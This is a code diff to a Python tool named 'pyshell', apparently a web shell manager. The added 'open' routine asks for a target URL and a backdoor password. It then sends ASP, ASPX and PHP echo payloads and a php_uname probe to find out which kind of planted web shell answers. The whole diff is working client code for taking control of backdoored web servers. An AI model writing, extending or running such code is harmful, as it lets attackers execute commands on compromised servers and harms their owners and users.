@@ -62,7 +62,35 @@ class pyshell:
                         pyshell.rpath = grey[len('set rpath')+1:]
                 if 'open' in grey:
                     if 'open ' not in grey:
-                        print("Usage: open http://localhost/xxx.php")
+                        url = input('(Url) ')
+                        pwd = input('(Pwd) ')
+                        try:
+                            asp_payload = '=response.Write("greyok")'
+                            asp_http = requests.get(url+'?'+pwd+asp_payload)
+                            asp_html = asp_http.text
+                            php_payload = 'echo "greyok";'
+                            php_http = requests.post(url,data={pwd:php_payload})
+                            php_html = php_http.text
+                            aspx_payload = 'Response.Write("greyok");'
+                            aspx_http = requests.post(url,data={pwd:aspx_payload})
+                            aspx_html = aspx_http.text
+                            uname = 'echo php_uname(\'s\');'
+                            uname_http = requests.post(url,data={pwd:uname})
+                            uname_html = uname_http.text
+                            if 'greyok' in asp_html:
+                                print("[√] The connection is successful!")
+                                pyshell.data = '[√] '
+                                pyshell.Type = 'asp'
+                            if 'greyok' in aspx_html:
+                                print("[√] The connection is successful!")
+                                pyshell.data = '[√] '
+                                pyshell.Type = 'aspx'
+                            if 'greyok' in php_html:
+                                print("[√] The connection is successful!")
+                                pyshell.data = '[√] '
+                                pyshell.Type = 'php'
+                        except Exception as e:
+                            pass
                     else:
                         url = grey[len('open')+1:]
                         pwd = input('(Pwd) ')
